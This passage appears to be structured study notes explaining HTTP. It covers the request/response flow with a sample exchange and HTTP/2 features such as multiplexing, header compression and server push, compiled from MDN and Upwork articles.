In order to mitigate this flaw, HTTP/1.1 introduced pipelining (which proved difficult to implement) and persistent connections: the underlying TCP connection can be partially controlled using the Connection header. HTTP/2 went a step further by multiplexing messages over a single connection, helping keep the connection warm and more efficient.

Experiments are in progress to design a better transport protocol more suited to HTTP. For example, Google is experimenting with QUIC which builds on UDP to provide a more reliable and efficient transport protocol.

                19.1.1.6.5 What can be controlled by HTTP
This extensible nature of HTTP has, over time, allowed for more control and functionality of the Web. Cache and authentication methods were functions handled early in HTTP history. The ability to relax the origin constraint, by contrast, was only added in the 2010s.

Here is a list of common features controllable with HTTP:

Caching: How documents are cached can be controlled by HTTP. The server can instruct proxies and clients about what to cache and for how long. The client can instruct intermediate cache proxies to ignore the stored document.
Relaxing the origin constraint: To prevent snooping and other privacy invasions, Web browsers enforce strict separation between Web sites. Only pages from the same origin can access all the information of a Web page. Though such a constraint is a burden to the server, HTTP headers can relax this strict separation on the server side, allowing a document to become a patchwork of information sourced from different domains; there could even be security-related reasons to do so.
Authentication: Some pages may be protected so that only specific users can access them. Basic authentication may be provided by HTTP, either using the WWW-Authenticate and similar headers, or by setting a specific session using HTTP cookies.
Proxy and tunneling: Servers or clients are often located on intranets and hide their true IP address from other computers. HTTP requests then go through proxies to cross this network barrier. Not all proxies are HTTP proxies. The SOCKS protocol, for example, operates at a lower level. Other protocols, like ftp, can be handled by these proxies.
Sessions: Using HTTP cookies allows you to link requests with the state of the server. This creates sessions, despite basic HTTP being a state-less protocol. This is useful not only for e-commerce shopping baskets, but also for any site allowing user configuration of the output.

                19.1.1.6.6 HTTP flow
When a client wants to communicate with a server, either the final server or an intermediate proxy, it performs the following steps:

Open a TCP connection: The TCP connection is used to send a request, or several, and receive an answer. The client may open a new connection, reuse an existing connection, or open several TCP connections to the servers.
Send an HTTP message: HTTP messages (before HTTP/2) are human-readable. With HTTP/2, these simple messages are encapsulated in frames, making them impossible to read directly, but the principle remains the same. For example:
GET / HTTP/1.1
Host: developer.mozilla.org
Accept-Language: fr

Read the response sent by the server, such as:
HTTP/1.1 200 OK
Date: Sat, 09 Oct 2010 14:28:02 GMT
Server: Apache
Last-Modified: Tue, 01 Dec 2009 20:18:22 GMT
ETag: "51142bc1-7449-479b075b2891b"
Accept-Ranges: bytes
Content-Length: 29769
Content-Type: text/html

<!DOCTYPE html>… (here come the 29769 bytes of the requested web page)
Close or reuse the connection for further requests.

If HTTP pipelining is activated, several requests can be sent without waiting for the first response to be fully received. HTTP pipelining has proven difficult to implement in existing networks, where old pieces of software coexist with modern versions. HTTP pipelining has been superseded in HTTP/2 with more robust multiplexing requests within a frame.

                19.1.1.6.7 HTTP Messages
HTTP messages, as defined in HTTP/1.1 and earlier, are human-readable. In HTTP/2, these messages are embedded into a binary structure, a frame, allowing optimizations like compression of headers and multiplexing. Even if only part of the original HTTP message is sent in this version of HTTP, the semantics of each message is unchanged and the client reconstitutes (virtually) the original HTTP/1.1 request. It is therefore useful to comprehend HTTP/2 messages in the HTTP/1.1 format.

There are two types of HTTP messages, requests and responses, each with its own format.

                    19.1.1.6.7.1 Requests
An example HTTP request:

A basic HTTP request
Requests consist of the following elements:

An HTTP method, usually a verb like GET, POST, or a noun like OPTIONS or HEAD that defines the operation the client wants to perform. Typically, a client wants to fetch a resource (using GET) or post the value of an HTML form (using POST), though more operations may be needed in other cases.
The path of the resource to fetch; the URL of the resource stripped from elements that are obvious from the context, for example without the protocol (http://), the domain (here, developer.mozilla.org), or the TCP port (here, 80).
The version of the HTTP protocol.
Optional headers that convey additional information for the servers.
A body, for some methods like POST, similar to those in responses, which contain the resource sent.

                    19.1.1.6.7.2 Responses
An example response:

HTTP Response image
Responses consist of the following elements:

The version of the HTTP protocol they follow.
A status code, indicating if the request was successful or not, and why.
A status message, a non-authoritative short description of the status code.
HTTP headers, like those for requests.
Optionally, a body containing the fetched resource.

                19.1.1.6.8 APIs based on HTTP
The most commonly used API based on HTTP is the XMLHttpRequest API, which can be used to exchange data between a user agent and a server. The modern Fetch API provides the same features with a more powerful and flexible feature set.

Another API, server-sent events, is a one-way service that allows a server to send events to the client, using HTTP as a transport mechanism. Using the EventSource interface, the client opens a connection and establishes event handlers. The client browser automatically converts the messages that arrive on the HTTP stream into appropriate Event objects. Then it delivers them to the event handlers that have been registered for the events' type if known, or to the onmessage event handler if no type-specific event handler was established.
            19.1.1.7 Conclusion
HTTP is an extensible protocol that is easy to use. The client-server structure, combined with the ability to add headers, allows HTTP to advance along with the extended capabilities of the Web.

Though HTTP/2 adds some complexity by embedding HTTP messages in frames to improve performance, the basic structure of messages has stayed the same since HTTP/1.0. Session flow remains simple, allowing it to be investigated and debugged with a simple HTTP message monitor.


            19.1.1.8
        19.1.2
    19.2 HTTP/2 

        19.2.1 https://www.upwork.com/resources/what-is-http2

            19.2.1.1 primary goals of HTTP2
HTTP/2 is the second version of the HTTP protocol aiming to make applications faster, simpler, and more robust by improving many of the drawbacks of the first HTTP version.

The primary goals of HTTP/2 are:

Enable request and response multiplexing
Header compression
Compatibility with the methods, status codes, URIs, and header fields defined by the HTTP/1.1 standard
Optimized prioritization of requests, making sure that loading for optimal user experience is as fast as possible
Support for server-side push
Server-side backwards compatibility, making sure servers can still serve clients only supporting HTTP/1.1 without any changes
Transforming to a binary protocol from the text-based HTTP/1.1

Some key features of HTTP/2 include:

Binary: Meaning commands use 1s and 0s and not text
Multiplex: Permits multiple requests and responses to be sent at the same time
Compression: Compresses headers that have been requested previously to make things more efficient
Stream prioritization: This allows for the exchange of successive streams at one time
Server push: The server can send additional information needed for a request before it is requested
Increased security: HTTP/2 is supported through encrypted connections

            19.2.1.2 HTTP/1.1 vs. HTTP/2: Main differences
As mentioned, the aim when designing HTTP/2 was to fix many of the drawbacks experienced with HTTP/1.1. In this section, we go through the differences between HTTP/2 and its predecessor.

Compression
HTTP/2 offers built-in compression of the request headers (HPACK). Modern web applications usually accept a range of different headers, such as authorization, caching directives, and client information. While compression of these might not make much of a difference for a single request, there is a lot of data sent over the network to be saved when compressing them in high-traffic applications. HTTP/1.1 does not compress headers by default.

Performance
Many of the new features in HTTP/2 are aimed at improving performance for the end-user. One example of this is how external resources can be preemptively pushed to the client's browser before they are explicitly requested. HTTP/1.1 does not have these advanced features.

Binary protocol
HTTP/2 is binary instead of textual as HTTP/1.1. In practice, this means simplified implementation of commands that previously could be mixed up due to optional whitespace when using the text format. Browsers that support HTTP/2 will convert textual commands into binary before sending them over the network.

Security
Because of the binary format used by HTTP/2, there is no longer a risk with so-called response splitting attacks that are possible with HTTP/1.1. This enables an attacker to manipulate the response headers by injecting whitespace into a textual response. This is no longer possible with the binary format of HTTP/2.

Delivery models
While the HTTP/1.1 protocol delivers responses based on a single request, HTTP/2 uses multiplexing and server push features to increase the delivery performance.

Buffer overflow
The buffer is the space used by the client and server that holds the requests that have not yet been processed. In HTTP/1.1, the flow control used to manage the available buffer space is implemented at the transport layer. In HTTP/2, the client and server can implement their own flow controls to communicate the available buffer space.

Multiplexing
HTTP/2 enables full request and response multiplexing. In practice, this means a connection made to a web server from your browser can be used to send multiple requests and receive multiple responses. This gets rid of a lot of the additional time that it takes to establish a new connection for each request. HTTP/1.1 does not support multiplexing.

Faster encrypted connections
HTTP/2 uses the new ALPN extension, which allows for faster-encrypted connections since the application protocol is determined during the initial connection. Using HTTP/1.1 without ALPN needs additional round trips for the encryption handshake.

No need for HTTP/1.1 workarounds
In order to bypass some of the drawbacks with HTTP/1.1, multiple workarounds have been invented. Two examples of these are:

Domain sharding is a common performance workaround used with HTTP/1.1 to trick browsers into opening more simultaneous connections than would normally be allowed.

Another common workaround for HTTP/1.1 is content concatenation used to reduce the number of requests for different resources. To achieve this, web developers often combine all the CSS and JavaScript into single files.

These are no longer needed with the built-in multiplexing in HTTP/2.


            19.2.1.3
        19.2.2 RFC https://datatracker.ietf.org/doc/html/rfc7540 

        19.2.3
    19.3
20.
